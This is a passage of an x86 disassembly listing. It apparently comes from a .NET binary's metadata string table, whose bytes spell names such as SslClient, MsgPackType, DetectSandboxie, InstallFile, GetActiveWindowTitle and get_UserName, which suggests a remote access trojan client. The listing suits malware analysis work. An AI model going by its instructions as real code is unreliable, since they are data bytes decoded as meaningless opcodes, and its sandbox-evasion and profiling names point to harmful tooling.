  407c00:	61                   	popa
  407c01:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c04:	6e                   	outsb  %ds:(%esi),(%dx)
  407c05:	67 46                	addr16 inc %esi
  407c07:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  407c0e:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  407c15:	42                   	inc    %edx
  407c16:	61                   	popa
  407c17:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c1a:	6e                   	outsb  %ds:(%esi),(%dx)
  407c1b:	67 46                	addr16 inc %esi
  407c1d:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  407c24:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407c28:	61                   	popa
  407c29:	74 65                	je     0x407c90
  407c2b:	50                   	push   %eax
  407c2c:	6f                   	outsl  %ds:(%esi),(%dx)
  407c2d:	6e                   	outsb  %ds:(%esi),(%dx)
  407c2e:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  407c34:	61                   	popa
  407c35:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c38:	6e                   	outsb  %ds:(%esi),(%dx)
  407c39:	67 46                	addr16 inc %esi
  407c3b:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407c42:	6e                   	outsb  %ds:(%esi),(%dx)
  407c43:	74 65                	je     0x407caa
  407c45:	72 76                	jb     0x407cbd
  407c47:	61                   	popa
  407c48:	6c                   	insb   (%dx),%es:(%edi)
  407c49:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407c4e:	61                   	popa
  407c4f:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c52:	6e                   	outsb  %ds:(%esi),(%dx)
  407c53:	67 46                	addr16 inc %esi
  407c55:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  407c5c:	75 66                	jne    0x407cc4
  407c5e:	66 65 72 3e          	data16 gs jb 0x407ca0
  407c62:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c66:	61                   	popa
  407c67:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c6a:	6e                   	outsb  %ds:(%esi),(%dx)
  407c6b:	67 46                	addr16 inc %esi
  407c6d:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  407c74:	66 66 73 65          	data16 data16 jae 0x407cdd
  407c78:	74 3e                	je     0x407cb8
  407c7a:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c7e:	61                   	popa
  407c7f:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c82:	6e                   	outsb  %ds:(%esi),(%dx)
  407c83:	67 46                	addr16 inc %esi
  407c85:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  407c8c:	73 6c                	jae    0x407cfa
  407c8e:	43                   	inc    %ebx
  407c8f:	6c                   	insb   (%dx),%es:(%edi)
  407c90:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407c97:	5f                   	pop    %edi
  407c98:	42                   	inc    %edx
  407c99:	61                   	popa
  407c9a:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c9d:	6e                   	outsb  %ds:(%esi),(%dx)
  407c9e:	67 46                	addr16 inc %esi
  407ca0:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  407ca7:	63 70 43             	arpl   %esi,0x43(%eax)
  407caa:	6c                   	insb   (%dx),%es:(%edi)
  407cab:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407cb2:	5f                   	pop    %edi
  407cb3:	42                   	inc    %edx
  407cb4:	61                   	popa
  407cb5:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407cb8:	6e                   	outsb  %ds:(%esi),(%dx)
  407cb9:	67 46                	addr16 inc %esi
  407cbb:	69 65 6c 64 00 49 6e 	imul   $0x6e490064,0x6c(%ebp),%esp
  407cc2:	6e                   	outsb  %ds:(%esi),(%dx)
  407cc3:	65 72 41             	gs jb  0x407d07
  407cc6:	64 64 4d             	fs fs dec %ebp
  407cc9:	61                   	popa
  407cca:	70 43                	jo     0x407d0f
  407ccc:	68 69 6c 64 00       	push   $0x646c69
  407cd1:	49                   	dec    %ecx
  407cd2:	6e                   	outsb  %ds:(%esi),(%dx)
  407cd3:	6e                   	outsb  %ds:(%esi),(%dx)
  407cd4:	65 72 41             	gs jb  0x407d18
  407cd7:	64 64 41             	fs fs inc %ecx
  407cda:	72 72                	jb     0x407d4e
  407cdc:	61                   	popa
  407cdd:	79 43                	jns    0x407d22
  407cdf:	68 69 6c 64 00       	push   $0x646c69
  407ce4:	68 57 6e 64 00       	push   $0x646e57
  407ce9:	53                   	push   %ebx
  407cea:	65 6e                	outsb  %gs:(%esi),(%dx)
  407cec:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  407cf0:	70 65                	jo     0x407d57
  407cf2:	6e                   	outsb  %ds:(%esi),(%dx)
  407cf3:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  407cf7:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  407cfe:	61 
  407cff:	6c                   	insb   (%dx),%es:(%edi)
  407d00:	75 65                	jne    0x407d67
  407d02:	4b                   	dec    %ebx
  407d03:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  407d0a:	6c                   	insb   (%dx),%es:(%edi)
  407d0b:	61                   	popa
  407d0c:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d0f:	43                   	inc    %ebx
  407d10:	72 65                	jb     0x407d77
  407d12:	61                   	popa
  407d13:	74 65                	je     0x407d7a
  407d15:	49                   	dec    %ecx
  407d16:	6e                   	outsb  %ds:(%esi),(%dx)
  407d17:	73 74                	jae    0x407d8d
  407d19:	61                   	popa
  407d1a:	6e                   	outsb  %ds:(%esi),(%dx)
  407d1b:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d1e:	73 65                	jae    0x407d85
  407d20:	74 5f                	je     0x407d81
  407d22:	4d                   	dec    %ebp
  407d23:	6f                   	outsl  %ds:(%esi),(%dx)
  407d24:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  407d29:	6c                   	insb   (%dx),%es:(%edi)
  407d2a:	65 4d                	gs dec %ebp
  407d2c:	6f                   	outsl  %ds:(%esi),(%dx)
  407d2d:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  407d32:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  407d39:	64 65 
  407d3b:	00 45 6e             	add    %al,0x6e(%ebp)
  407d3e:	74 65                	je     0x407da5
  407d40:	72 44                	jb     0x407d86
  407d42:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407d46:	4d                   	dec    %ebp
  407d47:	6f                   	outsl  %ds:(%esi),(%dx)
  407d48:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  407d4d:	79 70                	jns    0x407dbf
  407d4f:	74 6f                	je     0x407dc0
  407d51:	53                   	push   %ebx
  407d52:	74 72                	je     0x407dc6
  407d54:	65 61                	gs popa
  407d56:	6d                   	insl   (%dx),%es:(%edi)
  407d57:	4d                   	dec    %ebp
  407d58:	6f                   	outsl  %ds:(%esi),(%dx)
  407d59:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  407d5e:	6d                   	insl   (%dx),%es:(%edi)
  407d5f:	70 72                	jo     0x407dd3
  407d61:	65 73 73             	gs jae 0x407dd7
  407d64:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407d6b:	00 43 69             	add    %al,0x69(%ebx)
  407d6e:	70 68                	jo     0x407dd8
  407d70:	65 72 4d             	gs jb  0x407dc0
  407d73:	6f                   	outsl  %ds:(%esi),(%dx)
  407d74:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  407d79:	6c                   	insb   (%dx),%es:(%edi)
  407d7a:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407d7f:	64 65 00 75 74       	fs add %dh,%gs:0x74(%ebp)
  407d84:	66 38 45 6e          	data16 cmp %al,0x6e(%ebp)
  407d88:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407d8b:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407d90:	65 74 65             	gs je  0x407df8
  407d93:	53                   	push   %ebx
  407d94:	75 62                	jne    0x407df8
  407d96:	4b                   	dec    %ebx
  407d97:	65 79 54             	gs jns 0x407dee
  407d9a:	72 65                	jb     0x407e01
  407d9c:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407da0:	74 5f                	je     0x407e01
  407da2:	4d                   	dec    %ebp
  407da3:	65 73 73             	gs jae 0x407e19
  407da6:	61                   	popa
  407da7:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  407dac:	74 65                	je     0x407e13
  407dae:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407db2:	6e                   	outsb  %ds:(%esi),(%dx)
  407db3:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407db7:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  407dbe:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  407dc2:	45                   	inc    %ebp
  407dc3:	6e                   	outsb  %ds:(%esi),(%dx)
  407dc4:	75 6d                	jne    0x407e33
  407dc6:	65 72 61             	gs jb  0x407e2a
  407dc9:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407dcd:	49                   	dec    %ecx
  407dce:	44                   	inc    %esp
  407dcf:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407dd6:	6c                   	insb   (%dx),%es:(%edi)
  407dd7:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  407ddc:	6f                   	outsl  %ds:(%esi),(%dx)
  407ddd:	75 62                	jne    0x407e41
  407ddf:	6c                   	insb   (%dx),%es:(%edi)
  407de0:	65 00 53 77          	add    %dl,%gs:0x77(%ebx)
  407de4:	61                   	popa
  407de5:	70 44                	jo     0x407e2b
  407de7:	6f                   	outsl  %ds:(%esi),(%dx)
  407de8:	75 62                	jne    0x407e4c
  407dea:	6c                   	insb   (%dx),%es:(%edi)
  407deb:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407def:	74 5f                	je     0x407e50
  407df1:	48                   	dec    %eax
  407df2:	61                   	popa
  407df3:	6e                   	outsb  %ds:(%esi),(%dx)
  407df4:	64 6c                	fs insb (%dx),%es:(%edi)
  407df6:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407dfa:	6e                   	outsb  %ds:(%esi),(%dx)
  407dfb:	74 69                	je     0x407e66
  407dfd:	6d                   	insl   (%dx),%es:(%edi)
  407dfe:	65 46                	gs inc %esi
  407e00:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407e07:	64 6c                	fs insb (%dx),%es:(%edi)
  407e09:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e0d:	74 4d                	je     0x407e5c
  407e0f:	6f                   	outsl  %ds:(%esi),(%dx)
  407e10:	64 75 6c             	fs jne 0x407e7f
  407e13:	65 48                	gs dec %eax
  407e15:	61                   	popa
  407e16:	6e                   	outsb  %ds:(%esi),(%dx)
  407e17:	64 6c                	fs insb (%dx),%es:(%edi)
  407e19:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e1d:	6e                   	outsb  %ds:(%esi),(%dx)
  407e1e:	74 69                	je     0x407e89
  407e20:	6d                   	insl   (%dx),%es:(%edi)
  407e21:	65 54                	gs push %esp
  407e23:	79 70                	jns    0x407e95
  407e25:	65 48                	gs dec %eax
  407e27:	61                   	popa
  407e28:	6e                   	outsb  %ds:(%esi),(%dx)
  407e29:	64 6c                	fs insb (%dx),%es:(%edi)
  407e2b:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e2f:	74 54                	je     0x407e85
  407e31:	79 70                	jns    0x407ea3
  407e33:	65 46                	gs inc %esi
  407e35:	72 6f                	jb     0x407ea6
  407e37:	6d                   	insl   (%dx),%es:(%edi)
  407e38:	48                   	dec    %eax
  407e39:	61                   	popa
  407e3a:	6e                   	outsb  %ds:(%esi),(%dx)
  407e3b:	64 6c                	fs insb (%dx),%es:(%edi)
  407e3d:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407e41:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407e48:	65 
  407e49:	00 57 72             	add    %dl,0x72(%edi)
  407e4c:	69 74 65 53 69 6e 67 	imul   $0x6c676e69,0x53(%ebp,%eiz,2),%esi
  407e53:	6c 
  407e54:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407e59:	69 6e 67 6c 65 00 53 	imul   $0x5300656c,0x67(%esi),%ebp
  407e60:	65 74 41             	gs je  0x407ea4
  407e63:	73 53                	jae    0x407eb8
  407e65:	69 6e 67 6c 65 00 49 	imul   $0x4900656c,0x67(%esi),%ebp
  407e6c:	6e                   	outsb  %ds:(%esi),(%dx)
  407e6d:	73 74                	jae    0x407ee3
  407e6f:	61                   	popa
  407e70:	6c                   	insb   (%dx),%es:(%edi)
  407e71:	6c                   	insb   (%dx),%es:(%edi)
  407e72:	46                   	inc    %esi
  407e73:	69 6c 65 00 44 65 63 	imul   $0x6f636544,0x0(%ebp,%eiz,2),%ebp
  407e7a:	6f 
  407e7b:	64 65 46             	fs gs inc %esi
  407e7e:	72 6f                	jb     0x407eef
  407e80:	6d                   	insl   (%dx),%es:(%edi)
  407e81:	46                   	inc    %esi
  407e82:	69 6c 65 00 53 61 76 	imul   $0x65766153,0x0(%ebp,%eiz,2),%ebp
  407e89:	65 
  407e8a:	42                   	inc    %edx
  407e8b:	79 74                	jns    0x407f01
  407e8d:	65 73 54             	gs jae 0x407ee4
  407e90:	6f                   	outsl  %ds:(%esi),(%dx)
  407e91:	46                   	inc    %esi
  407e92:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407e99:	6e 
  407e9a:	52                   	push   %edx
  407e9b:	6f                   	outsl  %ds:(%esi),(%dx)
  407e9c:	6c                   	insb   (%dx),%es:(%edi)
  407e9d:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407ea1:	6e                   	outsb  %ds:(%esi),(%dx)
  407ea2:	64 6f                	outsl  %fs:(%esi),(%dx)
  407ea4:	77 73                	ja     0x407f19
  407ea6:	42                   	inc    %edx
  407ea7:	75 69                	jne    0x407f12
  407ea9:	6c                   	insb   (%dx),%es:(%edi)
  407eaa:	74 49                	je     0x407ef5
  407eac:	6e                   	outsb  %ds:(%esi),(%dx)
  407ead:	52                   	push   %edx
  407eae:	6f                   	outsl  %ds:(%esi),(%dx)
  407eaf:	6c                   	insb   (%dx),%es:(%edi)
  407eb0:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407eb4:	74 41                	je     0x407ef7
  407eb6:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407eba:	65 57                	gs push %edi
  407ebc:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407ec3:	74 6c                	je     0x407f31
  407ec5:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407ec9:	74 5f                	je     0x407f2a
  407ecb:	4d                   	dec    %ebp
  407ecc:	61                   	popa
  407ecd:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407ed4:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ed8:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed9:	63 65 73             	arpl   %esp,0x73(%ebp)
  407edc:	73 4d                	jae    0x407f2b
  407ede:	6f                   	outsl  %ds:(%esi),(%dx)
  407edf:	64 75 6c             	fs jne 0x407f4e
  407ee2:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407ee6:	74 5f                	je     0x407f47
  407ee8:	57                   	push   %edi
  407ee9:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407ef0:	79 6c                	jns    0x407f5e
  407ef2:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ef6:	6f                   	outsl  %ds:(%esi),(%dx)
  407ef7:	63 65 73             	arpl   %esp,0x73(%ebp)
  407efa:	73 57                	jae    0x407f53
  407efc:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407f03:	79 6c                	jns    0x407f71
  407f05:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f09:	74 5f                	je     0x407f6a
  407f0b:	4e                   	dec    %esi
  407f0c:	61                   	popa
  407f0d:	6d                   	insl   (%dx),%es:(%edi)
  407f0e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f12:	74 5f                	je     0x407f73
  407f14:	46                   	inc    %esi
  407f15:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f1c:	00 
  407f1d:	73 65                	jae    0x407f84
  407f1f:	74 5f                	je     0x407f80
  407f21:	46                   	inc    %esi
  407f22:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f29:	00 
  407f2a:	47                   	inc    %edi
  407f2b:	65 74 54             	gs je  0x407f82
  407f2e:	65 6d                	gs insl (%dx),%es:(%edi)
  407f30:	70 46                	jo     0x407f78
  407f32:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f39:	00 
  407f3a:	47                   	inc    %edi
  407f3b:	65 74 46             	gs je  0x407f84
  407f3e:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f45:	00 
  407f46:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  407f4d:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407f52:	6f                   	outsl  %ds:(%esi),(%dx)
  407f53:	64 75 6c             	fs jne 0x407fc2
  407f56:	65 4e                	gs dec %esi
  407f58:	61                   	popa
  407f59:	6d                   	insl   (%dx),%es:(%edi)
  407f5a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f5e:	74 5f                	je     0x407fbf
  407f60:	4d                   	dec    %ebp
  407f61:	61                   	popa
  407f62:	63 68 69             	arpl   %ebp,0x69(%eax)
  407f65:	6e                   	outsb  %ds:(%esi),(%dx)
  407f66:	65 4e                	gs dec %esi
  407f68:	61                   	popa
  407f69:	6d                   	insl   (%dx),%es:(%edi)
  407f6a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f6e:	74 5f                	je     0x407fcf
  407f70:	4f                   	dec    %edi
  407f71:	53                   	push   %ebx
  407f72:	46                   	inc    %esi
  407f73:	75 6c                	jne    0x407fe1
  407f75:	6c                   	insb   (%dx),%es:(%edi)
  407f76:	4e                   	dec    %esi
  407f77:	61                   	popa
  407f78:	6d                   	insl   (%dx),%es:(%edi)
  407f79:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f7d:	74 5f                	je     0x407fde
  407f7f:	46                   	inc    %esi
  407f80:	75 6c                	jne    0x407fee
  407f82:	6c                   	insb   (%dx),%es:(%edi)
  407f83:	4e                   	dec    %esi
  407f84:	61                   	popa
  407f85:	6d                   	insl   (%dx),%es:(%edi)
  407f86:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407f8a:	56                   	push   %esi
  407f8b:	61                   	popa
  407f8c:	6c                   	insb   (%dx),%es:(%edi)
  407f8d:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407f94:	6e 
  407f95:	4e                   	dec    %esi
  407f96:	61                   	popa
  407f97:	6d                   	insl   (%dx),%es:(%edi)
  407f98:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f9c:	74 5f                	je     0x407ffd
  407f9e:	55                   	push   %ebp
  407f9f:	73 65                	jae    0x408006
  407fa1:	72 4e                	jb     0x407ff1
  407fa3:	61                   	popa
  407fa4:	6d                   	insl   (%dx),%es:(%edi)
  407fa5:	65 00 6c 6f 77       	add    %ch,%gs:0x77(%edi,%ebp,2)
  407faa:	65 72 4e             	gs jb  0x407ffb
  407fad:	61                   	popa
  407fae:	6d                   	insl   (%dx),%es:(%edi)
  407faf:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407fb3:	74 4e                	je     0x408003
  407fb5:	61                   	popa
  407fb6:	6d                   	insl   (%dx),%es:(%edi)
  407fb7:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407fbb:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407fbf:	6f                   	outsl  %ds:(%esi),(%dx)
  407fc0:	73 74                	jae    0x408036
  407fc2:	4e                   	dec    %esi
  407fc3:	61                   	popa
  407fc4:	6d                   	insl   (%dx),%es:(%edi)
  407fc5:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407fc9:	6d                   	insl   (%dx),%es:(%edi)
  407fca:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407fcf:	65 54                	gs push %esp
  407fd1:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  407fd8:	5f                   	pop    %edi
  407fd9:	4c                   	dec    %esp
  407fda:	61                   	popa
  407fdb:	73 74                	jae    0x408051
  407fdd:	57                   	push   %edi
  407fde:	72 69                	jb     0x408049
  407fe0:	74 65                	je     0x408047
  407fe2:	54                   	push   %esp
  407fe3:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  407fea:	6e                   	outsb  %ds:(%esi),(%dx)
  407feb:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  407ff2:	54                   	push   %esp
  407ff3:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  407ffa:	74 65                	je     0x408061
  407ffc:	4c                   	dec    %esp
  407ffd:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  408004:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  408007:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  40800b:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408012:	6d                   	insl   (%dx),%es:(%edi)
  408013:	65 54                	gs push %esp
  408015:	79 70                	jns    0x408087
  408017:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40801b:	74 5f                	je     0x40807c
  40801d:	56                   	push   %esi
  40801e:	61                   	popa
  40801f:	6c                   	insb   (%dx),%es:(%edi)
  408020:	75 65                	jne    0x408087
  408022:	54                   	push   %esp
  408023:	79 70                	jns    0x408095
  408025:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  408029:	6c                   	insb   (%dx),%es:(%edi)
  40802a:	75 65                	jne    0x408091
  40802c:	54                   	push   %esp
  40802d:	79 70                	jns    0x40809f
  40802f:	65 00 4d 73          	add    %cl,%gs:0x73(%ebp)
  408033:	67 50                	addr16 push %eax
  408035:	61                   	popa
  408036:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  408039:	79 70                	jns    0x4080ab
  40803b:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40803f:	6f                   	outsl  %ds:(%esi),(%dx)
  408040:	74 6f                	je     0x4080b1
  408042:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408045:	54                   	push   %esp
  408046:	79 70                	jns    0x4080b8
  408048:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40804c:	74 54                	je     0x4080a2
  40804e:	79 70                	jns    0x4080c0
  408050:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  408054:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408057:	74 54                	je     0x4080ad
  408059:	79 70                	jns    0x4080cb
  40805b:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  40805f:	6c                   	insb   (%dx),%es:(%edi)
  408060:	65 53                	gs push %ebx
  408062:	68 61 72 65 00       	push   $0x657261
  408067:	53                   	push   %ebx
  408068:	79 73                	jns    0x4080dd
  40806a:	74 65                	je     0x4080d1
  40806c:	6d                   	insl   (%dx),%es:(%edi)
  40806d:	2e 43                	cs inc %ebx
  40806f:	6f                   	outsl  %ds:(%esi),(%dx)
  408070:	72 65                	jb     0x4080d7
  408072:	00 53 65             	add    %dl,0x65(%ebx)
  408075:	72 76                	jb     0x4080ed
  408077:	65 72 73             	gs jb  0x4080ed
  40807a:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  408081:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  408085:	6f                   	outsl  %ds:(%esi),(%dx)
  408086:	73 65                	jae    0x4080ed
  408088:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  40808c:	70 6f                	jo     0x4080fd
  40808e:	73 65                	jae    0x4080f5
  408090:	00 50 61             	add    %dl,0x61(%eax)
  408093:	72 73                	jb     0x408108
  408095:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408099:	72 52                	jb     0x4080ed
  40809b:	65 76 65             	gs jbe 0x408103
  40809e:	72 73                	jb     0x408113
  4080a0:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4080a4:	30 39                	xor    %bh,(%ecx)
  4080a6:	43                   	inc    %ebx
  4080a7:	65 72 74             	gs jb  0x40811e
  4080aa:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080b1:	00 56 61             	add    %dl,0x61(%esi)
  4080b4:	6c                   	insb   (%dx),%es:(%edi)
  4080b5:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  4080bc:	72 
  4080bd:	76 65                	jbe    0x408124
  4080bf:	72 43                	jb     0x408104
  4080c1:	65 72 74             	gs jb  0x408138
  4080c4:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080cb:	00 63 65             	add    %ah,0x65(%ebx)
  4080ce:	72 74                	jb     0x408144
  4080d0:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080d7:	00 43 72             	add    %al,0x72(%ebx)
  4080da:	65 61                	gs popa
  4080dc:	74 65                	je     0x408143
  4080de:	00 53 65             	add    %dl,0x65(%ebx)
  4080e1:	74 54                	je     0x408137
  4080e3:	68 72 65 61 64       	push   $0x64616572
  4080e8:	45                   	inc    %ebp
  4080e9:	78 65                	js     0x408150
  4080eb:	63 75 74             	arpl   %esi,0x74(%ebp)
  4080ee:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4080f5:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4080fa:	65 74 65             	gs je  0x408162
  4080fd:	00 43 61             	add    %al,0x61(%ebx)
  408100:	6c                   	insb   (%dx),%es:(%edi)
  408101:	6c                   	insb   (%dx),%es:(%edi)
  408102:	53                   	push   %ebx
  408103:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  40810a:	74 
  40810b:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40810f:	6d                   	insl   (%dx),%es:(%edi)
  408110:	70 69                	jo     0x40817b
  408112:	6c                   	insb   (%dx),%es:(%edi)
  408113:	65 72 47             	gs jb  0x40815d
  408116:	65 6e                	outsb  %gs:(%esi),(%dx)
  408118:	65 72 61             	gs jb  0x40817c
  40811b:	74 65                	je     0x408182
  40811d:	64 41                	fs inc %ecx
  40811f:	74 74                	je     0x408195
  408121:	72 69                	jb     0x40818c
  408123:	62 75 74             	bound  %esi,0x74(%ebp)
  408126:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40812b:	75 67                	jne    0x408194
  40812d:	67 61                	addr16 popa
  40812f:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408133:	74 74                	je     0x4081a9
  408135:	72 69                	jb     0x4081a0
  408137:	62 75 74             	bound  %esi,0x74(%ebp)
  40813a:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40813e:	6d                   	insl   (%dx),%es:(%edi)
  40813f:	56                   	push   %esi
  408140:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  408147:	74 74                	je     0x4081bd
  408149:	72 69                	jb     0x4081b4
  40814b:	62 75 74             	bound  %esi,0x74(%ebp)
  40814e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408152:	73 65                	jae    0x4081b9
  408154:	6d                   	insl   (%dx),%es:(%edi)
  408155:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408159:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408160:	72 
  408161:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408168:	73 73                	jae    0x4081dd
  40816a:	65 6d                	gs insl (%dx),%es:(%edi)
  40816c:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408170:	72 61                	jb     0x4081d3
  408172:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  408175:	61                   	popa
  408176:	72 6b                	jb     0x4081e3
  408178:	41                   	inc    %ecx
